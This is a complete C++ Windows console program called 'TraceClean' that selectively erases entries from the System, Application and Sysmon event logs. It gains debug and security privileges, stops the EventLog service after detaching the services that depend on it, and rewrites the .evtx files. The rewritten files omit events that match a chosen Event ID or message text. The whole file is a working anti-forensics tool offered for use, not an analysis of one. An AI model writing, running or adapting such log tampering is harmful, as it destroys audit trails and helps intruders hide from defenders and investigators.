typedef long NTSTATUS;
#define WIN32_LEAN_AND_MEAN
#include <cstdint>
#include <windows.h>
#include <objbase.h>
#include <winsvc.h>
#include <winevt.h>
#include <iostream>
#include <string>
#include <vector>
#include <algorithm>

#pragma comment(lib, "wevtapi.lib")

#define NT_SUCCESS(x) ((x) >= 0)
#define uSTATUS_INFO_LENGTH_MISMATCH 0xc0000004
#define SystemHandleInformation 16
#define ObjectBasicInformation 0
#define ObjectNameInformation 1
#define ObjectTypeInformation 2

#define COLOR_DEFAULT 7
#define COLOR_SUCCESS 10
#define COLOR_ERROR 12
#define COLOR_WARNING 14
#define COLOR_INFO 11
#define COLOR_CYAN 3

static void SetColor(int color)
{
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hConsole, color);
}

static void ResetColor()
{
	SetColor(COLOR_DEFAULT);
}

static const wchar_t* k_SystemLog =
L"C:\\Windows\\System32\\winevt\\Logs\\System.evtx";

static const wchar_t* k_ApplicationLog =
L"C:\\Windows\\System32\\winevt\\Logs\\Application.evtx";

static const wchar_t* k_SysmonLog =
L"C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Sysmon%4Operational.evtx";

static bool EnableDebugPrivilege()
{
	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
		return false;

	DWORD count = 2;
	DWORD size = sizeof(TOKEN_PRIVILEGES) + (count - 1) * sizeof(LUID_AND_ATTRIBUTES);
	std::vector<BYTE> buf(size, 0);
	PTOKEN_PRIVILEGES tp = (PTOKEN_PRIVILEGES)buf.data();
	tp->PrivilegeCount = count;
	tp->Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	LookupPrivilegeValueW(nullptr, L"SeDebugPrivilege", &tp->Privileges[0].Luid);
	tp->Privileges[1].Attributes = SE_PRIVILEGE_ENABLED;
	LookupPrivilegeValueW(nullptr, L"SeSecurityPrivilege", &tp->Privileges[1].Luid);
	bool ok = AdjustTokenPrivileges(hToken, FALSE, tp, size, nullptr, nullptr) != 0;
	CloseHandle(hToken);
	return ok;
}

struct DepEntry { std::wstring name; std::vector<WCHAR> origDeps; };

static std::vector<DepEntry> StopEventLogService(SC_HANDLE scm)
{
	std::vector<DepEntry> changedDeps;

	SC_HANDLE hSvc = OpenServiceW(scm, L"EventLog", SERVICE_ENUMERATE_DEPENDENTS);
	if (hSvc)
	{
		DWORD bytesNeeded = 0, count = 0;
		EnumDependentServicesW(hSvc, SERVICE_ACTIVE, nullptr, 0, &bytesNeeded, &count);
		if (GetLastError() == ERROR_MORE_DATA && bytesNeeded > 0)
		{
			std::vector<BYTE> buf(bytesNeeded);
			LPENUM_SERVICE_STATUSW deps = (LPENUM_SERVICE_STATUSW)buf.data();
			if (EnumDependentServicesW(hSvc, SERVICE_ACTIVE, deps, bytesNeeded, &bytesNeeded, &count))
			{
				for (DWORD i = 0; i < count; i++)
				{
					SC_HANDLE hDep = OpenServiceW(scm, deps[i].lpServiceName,
						SERVICE_QUERY_CONFIG | SERVICE_CHANGE_CONFIG);
					if (!hDep) continue;

					DWORD cfgBytes = 0;
					QueryServiceConfigW(hDep, nullptr, 0, &cfgBytes);
					if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) { CloseServiceHandle(hDep); continue; }

					std::vector<BYTE> cfgBuf(cfgBytes);
					LPQUERY_SERVICE_CONFIGW pCfg = (LPQUERY_SERVICE_CONFIGW)cfgBuf.data();
					if (!QueryServiceConfigW(hDep, pCfg, cfgBytes, &cfgBytes)) { CloseServiceHandle(hDep); continue; }

					if (!pCfg->lpDependencies || !pCfg->lpDependencies[0]) { CloseServiceHandle(hDep); continue; }

					bool hasEventLog = false;
					WCHAR* p = pCfg->lpDependencies;
					while (*p) { if (_wcsicmp(p, L"EventLog") == 0) { hasEventLog = true; break; } p += wcslen(p) + 1; }
					if (!hasEventLog) { CloseServiceHandle(hDep); continue; }

					DepEntry de;
					de.name = deps[i].lpServiceName;
					size_t totalLen = 0;
					p = pCfg->lpDependencies;
					while (*p) { totalLen += wcslen(p) + 1; p += wcslen(p) + 1; }
					totalLen += 1;
					de.origDeps.assign(pCfg->lpDependencies, pCfg->lpDependencies + totalLen);

					std::vector<WCHAR> newDeps;
					p = pCfg->lpDependencies;
					while (*p)
					{
						if (_wcsicmp(p, L"EventLog") != 0)
						{
							size_t len = wcslen(p) + 1;
							size_t old = newDeps.size();
							newDeps.resize(old + len);
							wcscpy_s(newDeps.data() + old, len, p);
						}
						p += wcslen(p) + 1;
					}
					newDeps.push_back(L'\0');

					if (ChangeServiceConfigW(hDep, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE,
						SERVICE_NO_CHANGE, nullptr, nullptr, nullptr, newDeps.data(),
						nullptr, nullptr, nullptr))
						changedDeps.push_back(std::move(de));
					CloseServiceHandle(hDep);
				}
			}
		}
		CloseServiceHandle(hSvc);
	}

	hSvc = OpenServiceW(scm, L"EventLog", SERVICE_STOP | SERVICE_QUERY_STATUS);
	if (hSvc)
	{
		SERVICE_STATUS ss;
		ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
		for (int tries = 0; tries < 40; tries++)
		{
			if (!QueryServiceStatus(hSvc, &ss)) break;
			if (ss.dwCurrentState == SERVICE_STOPPED) break;
			Sleep(500);
		}
		CloseServiceHandle(hSvc);
	}
	return changedDeps;
}

static void StartEventLogService(SC_HANDLE scm, std::vector<DepEntry>& changedDeps)
{
	SC_HANDLE hSvc = OpenServiceW(scm, L"EventLog", SERVICE_START | SERVICE_QUERY_STATUS);
	if (hSvc)
	{
		StartServiceW(hSvc, 0, nullptr);
		SERVICE_STATUS ss;
		for (int tries = 0; tries < 30; tries++)
		{
			if (!QueryServiceStatus(hSvc, &ss)) break;
			if (ss.dwCurrentState == SERVICE_RUNNING) break;
			Sleep(1000);
		}
		CloseServiceHandle(hSvc);
	}

	for (auto& de : changedDeps)
	{
		SC_HANDLE hDep = OpenServiceW(scm, de.name.c_str(), SERVICE_CHANGE_CONFIG);
		if (hDep)
		{
			ChangeServiceConfigW(hDep, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE,
				SERVICE_NO_CHANGE, nullptr, nullptr, nullptr, de.origDeps.data(),
				nullptr, nullptr, nullptr);
			CloseServiceHandle(hDep);
		}
	}
}

static bool ReadEvtxWhileStopped(const wchar_t* logPath, std::vector<uint8_t>& outData)
{
	SC_HANDLE scm = OpenSCManager(nullptr, nullptr, SC_MANAGER_CONNECT);
	if (!scm) return false;

	auto changedDeps = StopEventLogService(scm);

	bool ok = false;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	for (int attempt = 0; attempt < 10; attempt++)
	{
		hFile = CreateFileW(logPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
			nullptr, OPEN_EXISTING, 0, nullptr);
		if (hFile != INVALID_HANDLE_VALUE) break;
		Sleep(300);
	}

	if (hFile != INVALID_HANDLE_VALUE)
	{
		LARGE_INTEGER fileSize;
		if (GetFileSizeEx(hFile, &fileSize) && fileSize.QuadPart >= 0x2000)
		{
			outData.resize((size_t)fileSize.QuadPart);
			DWORD bytesRead = 0;
			if (ReadFile(hFile, outData.data(), (DWORD)fileSize.QuadPart, &bytesRead, nullptr)
				&& bytesRead == (DWORD)fileSize.QuadPart)
			{
				if (memcmp(outData.data(), "ElfFile\0", 8) == 0)
					ok = true;
			}
		}
		CloseHandle(hFile);
	}

	StartEventLogService(scm, changedDeps);
	CloseServiceHandle(scm);
	return ok;
}

static bool WriteEvtxDirect(const wchar_t* logPath, const std::vector<uint8_t>& data)
{
	SC_HANDLE scm = OpenSCManager(nullptr, nullptr, SC_MANAGER_CONNECT);
	if (!scm) return false;

	auto changedDeps = StopEventLogService(scm);

	HANDLE hOrig = INVALID_HANDLE_VALUE;
	for (int attempt = 0; attempt < 10; attempt++)
	{
		hOrig = CreateFileW(logPath, GENERIC_WRITE, FILE_SHARE_READ,
			nullptr, OPEN_EXISTING, 0, nullptr);
		if (hOrig != INVALID_HANDLE_VALUE) break;
		Sleep(500);
	}

	bool ok = false;
	if (hOrig != INVALID_HANDLE_VALUE)
	{
		DWORD written = 0;
		WriteFile(hOrig, data.data(), (DWORD)data.size(), &written, nullptr);
		SetEndOfFile(hOrig);
		CloseHandle(hOrig);
		ok = (written == (DWORD)data.size());
	}

	StartEventLogService(scm, changedDeps);
	CloseServiceHandle(scm);
	return ok;
}

static std::wstring WriteTempFile(const std::vector<uint8_t>& data)
{
	WCHAR tmpDir[MAX_PATH];
	GetTempPathW(MAX_PATH, tmpDir);
	GUID g; CoCreateGuid(&g);
	WCHAR gs[40]; StringFromGUID2(g, gs, 40);
	std::wstring path(tmpDir);
	path += (gs + 1); path.pop_back(); path += L".tmp";

	HANDLE hFile = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr,
		CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hFile == INVALID_HANDLE_VALUE) return L"";
	DWORD written = 0;
	WriteFile(hFile, data.data(), (DWORD)data.size(), &written, nullptr);
	CloseHandle(hFile);
	if (written != (DWORD)data.size()) { DeleteFileW(path.c_str()); return L""; }
	return path;
}

static bool ReadAllBytes(const wchar_t* path, std::vector<uint8_t>& outData)
{
	HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
		nullptr, OPEN_EXISTING, 0, nullptr);
	if (hFile == INVALID_HANDLE_VALUE) return false;
	LARGE_INTEGER sz;
	if (!GetFileSizeEx(hFile, &sz) || sz.QuadPart == 0)
	{
		CloseHandle(hFile); return false;
	}
	outData.resize((size_t)sz.QuadPart);
	DWORD bytesRead = 0;
	bool ok = ReadFile(hFile, outData.data(), (DWORD)sz.QuadPart, &bytesRead, nullptr)
		&& bytesRead == (DWORD)sz.QuadPart;
	CloseHandle(hFile);
	return ok;
}

static std::wstring ExportWithXPath(const std::wstring& snapPath, const std::wstring& xpath)
{
	GUID g; CoCreateGuid(&g);
	WCHAR gs[40]; StringFromGUID2(g, gs, 40);
	WCHAR tmpDir[MAX_PATH]; GetTempPathW(MAX_PATH, tmpDir);
	std::wstring outPath(tmpDir);
	outPath += (gs + 1); outPath.pop_back(); outPath += L".tmp";

	BOOL result = EvtExportLog(nullptr, snapPath.c_str(), xpath.c_str(), outPath.c_str(),
		EvtExportLogFilePath | EvtExportLogTolerateQueryErrors);

	if (!result)
	{
		if (GetFileAttributesW(outPath.c_str()) == INVALID_FILE_ATTRIBUTES)
			return L"";
	}
	return outPath;
}

static bool CleanEventIDFromLog(DWORD eventIdToRemove, const wchar_t* logPath, const wchar_t* logDisplayName)
{
	if (GetFileAttributesW(logPath) == INVALID_FILE_ATTRIBUTES)
		return true;

	std::vector<uint8_t> fileData;
	if (!ReadEvtxWhileStopped(logPath, fileData))
		return false;

	std::wstring snapPath = WriteTempFile(fileData);
	if (snapPath.empty())
		return false;

	std::wstring xpath = L"*[System[EventID != " + std::to_wstring(eventIdToRemove) + L"]]";
	std::wstring outPath = ExportWithXPath(snapPath, xpath);
	DeleteFileW(snapPath.c_str());

	if (outPath.empty())
		return false;

	std::vector<uint8_t> resultData;
	bool readOk = ReadAllBytes(outPath.c_str(), resultData);
	DeleteFileW(outPath.c_str());

	if (!readOk || resultData.empty())
		return false;

	return WriteEvtxDirect(logPath, resultData);
}

static std::wstring ExtractXmlAttr(const std::wstring& xml,
	const std::wstring& tag, const std::wstring& attr)
{
	size_t tagPos = xml.find(L"<" + tag);
	if (tagPos == std::wstring::npos) return L"";

	std::wstring attrKey = attr + L"=\"";
	size_t aPos = xml.find(attrKey, tagPos);
	if (aPos == std::wstring::npos) return L"";

	size_t tagEnd = xml.find(L">", tagPos);
	if (tagEnd != std::wstring::npos && aPos > tagEnd) return L"";

	aPos += attrKey.size();
	size_t aEnd = xml.find(L"\"", aPos);
	if (aEnd == std::wstring::npos) return L"";
	return xml.substr(aPos, aEnd - aPos);
}

static std::wstring ExtractXmlText(const std::wstring& xml,
	const std::wstring& openTag, const std::wstring& closeTag)
{
	size_t s = xml.find(openTag);
	if (s == std::wstring::npos) return L"";
	s += openTag.size();
	size_t e = xml.find(closeTag, s);
	if (e == std::wstring::npos) return L"";
	return xml.substr(s, e - s);
}

static std::wstring ExtractXmlBlock(const std::wstring& xml,
	const std::wstring& openTag, const std::wstring& closeTag)
{
	size_t s = xml.find(openTag);
	if (s == std::wstring::npos) return L"";
	size_t e = xml.find(closeTag, s);
	if (e == std::wstring::npos) return L"";
	return xml.substr(s, e + closeTag.size() - s);
}

static std::vector<ULONGLONG> FindRecordIDsByMessage(const wchar_t* logPath,
	const std::wstring& searchStr)
{
	std::vector<ULONGLONG> matched;

	EVT_HANDLE hQuery = EvtQuery(nullptr, logPath, L"*",
		EvtQueryFilePath | EvtQueryForwardDirection);
	if (!hQuery)
		return matched;

	std::wstring lowerSearch = searchStr;
	for (auto& c : lowerSearch) c = towlower(c);

	EVT_HANDLE hEvent = nullptr;
	DWORD returned = 0;

	while (EvtNext(hQuery, 1, &hEvent, INFINITE, 0, &returned))
	{
		DWORD bufUsed = 0, propCount = 0;

		EvtRender(nullptr, hEvent, EvtRenderEventXml, 0, nullptr, &bufUsed, &propCount);
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER || bufUsed == 0)
		{
			EvtClose(hEvent); hEvent = nullptr; continue;
		}

		std::vector<WCHAR> xmlBuf(bufUsed / sizeof(WCHAR) + 2, L'\0');
		DWORD bufSize = (DWORD)xmlBuf.size() * sizeof(WCHAR);
		if (!EvtRender(nullptr, hEvent, EvtRenderEventXml, bufSize,
			xmlBuf.data(), &bufUsed, &propCount))
		{
			EvtClose(hEvent); hEvent = nullptr; continue;
		}

		std::wstring xml = xmlBuf.data();

		ULONGLONG recordId = 0;
		{
			std::wstring rid = ExtractXmlText(xml, L"<EventRecordID>", L"</EventRecordID>");
			if (!rid.empty())
				recordId = _wcstoui64(rid.c_str(), nullptr, 10);
		}

		bool found = false;

		std::wstring providerName = ExtractXmlAttr(xml, L"Provider", L"Name");

		if (!providerName.empty())
		{
			EVT_HANDLE hPub = EvtOpenPublisherMetadata(nullptr,
				providerName.c_str(), nullptr, 0, 0);

			if (hPub)
			{
				DWORD msgSize = 0;
				EvtFormatMessage(hPub, hEvent, 0, 0, nullptr,
					EvtFormatMessageEvent, 0, nullptr, &msgSize);

				DWORD probe_err = GetLastError();
				if (probe_err == ERROR_INSUFFICIENT_BUFFER && msgSize > 0)
				{
					std::vector<WCHAR> msgBuf(msgSize + 1, L'\0');
					EvtFormatMessage(hPub, hEvent, 0, 0, nullptr,
						EvtFormatMessageEvent, msgSize, msgBuf.data(), &msgSize);

					DWORD fmt_err = GetLastError();
					if (fmt_err == ERROR_SUCCESS ||
						fmt_err == ERROR_EVT_UNRESOLVED_VALUE_INSERT)
					{
						std::wstring msg = msgBuf.data();
						for (auto& c : msg) c = towlower(c);
						if (msg.find(lowerSearch) != std::wstring::npos)
							found = true;
					}
				}
				EvtClose(hPub);
			}
		}

		if (!found)
		{
			std::wstring payload;
			payload += ExtractXmlAttr(xml, L"Provider", L"Name") + L" ";
			payload += ExtractXmlText(xml, L"<EventID>", L"</EventID>") + L" ";
			payload += ExtractXmlBlock(xml, L"<EventData>", L"</EventData>") + L" ";
			payload += ExtractXmlBlock(xml, L"<UserData>", L"</UserData>") + L" ";

			if (payload.find(L'<') == std::wstring::npos)
				payload += ExtractXmlBlock(xml, L"<System>", L"</System>");

			for (auto& c : payload) c = towlower(c);
			if (!payload.empty() && payload.find(lowerSearch) != std::wstring::npos)
				found = true;
		}

		if (found && recordId != 0)
			matched.push_back(recordId);

		EvtClose(hEvent);
		hEvent = nullptr;
	}

	EvtClose(hQuery);
	return matched;
}

static bool CleanEventsByRecordIDs(const wchar_t* logPath,
	const std::vector<ULONGLONG>& recordIds)
{
	if (recordIds.empty()) return true;

	std::vector<uint8_t> fileData;
	if (!ReadEvtxWhileStopped(logPath, fileData))
		return false;

	const size_t BATCH = 100;
	size_t total = recordIds.size();

	for (size_t offset = 0; offset < total; offset += BATCH)
	{
		size_t end = (offset + BATCH < total) ? offset + BATCH : total;

		std::wstring cond;
		for (size_t i = offset; i < end; i++)
		{
			if (i > offset) cond += L" and ";
			cond += L"EventRecordID!=" + std::to_wstring(recordIds[i]);
		}
		std::wstring xpath = L"*[System[" + cond + L"]]";

		std::wstring snapPath = WriteTempFile(fileData);
		if (snapPath.empty()) return false;

		std::wstring outPath = ExportWithXPath(snapPath, xpath);
		DeleteFileW(snapPath.c_str());

		if (outPath.empty()) return false;

		std::vector<uint8_t> nextData;
		bool readOk = ReadAllBytes(outPath.c_str(), nextData);
		DeleteFileW(outPath.c_str());

		if (!readOk || nextData.empty()) return false;

		fileData = std::move(nextData);
	}

	return WriteEvtxDirect(logPath, fileData);
}

static void CleanEventsByMessageString(const std::wstring& searchStr)
{
	struct LogInfo { const wchar_t* path; const wchar_t* name; };
	LogInfo logs[] = {
		{ k_SystemLog,      L"System"      },
		{ k_ApplicationLog, L"Application" },
		{ k_SysmonLog,      L"Sysmon"      },
	};

	for (auto& log : logs)
	{
		if (GetFileAttributesW(log.path) == INVALID_FILE_ATTRIBUTES)
			continue;

		std::vector<ULONGLONG> records = FindRecordIDsByMessage(log.path, searchStr);
		if (!records.empty())
			CleanEventsByRecordIDs(log.path, records);
	}
}

static bool CleanLogByName(const std::wstring& logName, const std::wstring& searchStr)
{
	std::wstring name = logName;
	if (name.size() < 5 || _wcsicmp(name.c_str() + name.size() - 5, L".evtx") != 0)
		name += L".evtx";

	WCHAR sysRoot[MAX_PATH];
	if (!GetWindowsDirectoryW(sysRoot, MAX_PATH))
		wcscpy_s(sysRoot, MAX_PATH, L"C:\\Windows");

	std::wstring logPath = std::wstring(sysRoot) + L"\\System32\\winevt\\Logs\\" + name;

	if (GetFileAttributesW(logPath.c_str()) == INVALID_FILE_ATTRIBUTES)
		return false;

	std::vector<ULONGLONG> records = FindRecordIDsByMessage(logPath.c_str(), searchStr);
	if (records.empty())
		return true;

	return CleanEventsByRecordIDs(logPath.c_str(), records);
}

static bool IsNumericInput(const std::wstring& s)
{
	if (s.empty()) return false;
	for (wchar_t c : s)
		if (c < L'0' || c > L'9') return false;
	return true;
}

int wmain()
{
	CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
	SetConsoleTitleW(L"TraceClean");

	SetColor(COLOR_WARNING);
	std::wcout << L"[+] Developed By Kedar\n";
	ResetColor();

	if (!EnableDebugPrivilege())
	{
		SetColor(COLOR_ERROR);
		std::wcout << L"[-] Failed to enable debug privilege. Run as Administrator!\n";
		ResetColor();
		std::wcout << L"\nPress enter to exit....";
		std::wcin.get();
		return 1;
	}

	SetColor(COLOR_SUCCESS);
	std::wcout << L"[+] Running with administrator privileges\n";
	ResetColor();

	SetColor(COLOR_INFO);
	std::wcout << L"[+] Enter EventID or string name to clean: ";
	ResetColor();

	std::wstring inputLine;
	std::getline(std::wcin, inputLine);

	inputLine.erase(0, inputLine.find_first_not_of(L" \t\r\n"));
	if (!inputLine.empty())
		inputLine.erase(inputLine.find_last_not_of(L" \t\r\n") + 1);

	if (inputLine.empty())
	{
		std::wcout << L"\nPress enter to exit....";
		std::wcin.get();
		return 0;
	}

	SetColor(COLOR_INFO);
	std::wcout << L"[+] Clearing logs...\n";
	ResetColor();

	if (IsNumericInput(inputLine))
	{
		DWORD id = (DWORD)_wtoi(inputLine.c_str());

		bool allOk = true;
		if (!CleanEventIDFromLog(id, k_SystemLog, L"System"))      allOk = false;
		if (!CleanEventIDFromLog(id, k_ApplicationLog, L"Application")) allOk = false;
		if (!CleanEventIDFromLog(id, k_SysmonLog, L"Sysmon"))      allOk = false;

		if (allOk)
		{
			SetColor(COLOR_SUCCESS);
			std::wcout << L"[+] Logs cleared successfully!\n";
			ResetColor();
		}
		else
		{
			SetColor(COLOR_ERROR);
			std::wcout << L"[-] Failed to clear log...\n";
			ResetColor();
		}
	}
	else
	{
		CleanEventsByMessageString(inputLine);

		SetColor(COLOR_SUCCESS);
		std::wcout << L"[+] Logs cleared successfully!\n";
		ResetColor();
	}

	std::wcout << L"Press enter to exit....";
	std::wcin.get();
	return 0;
}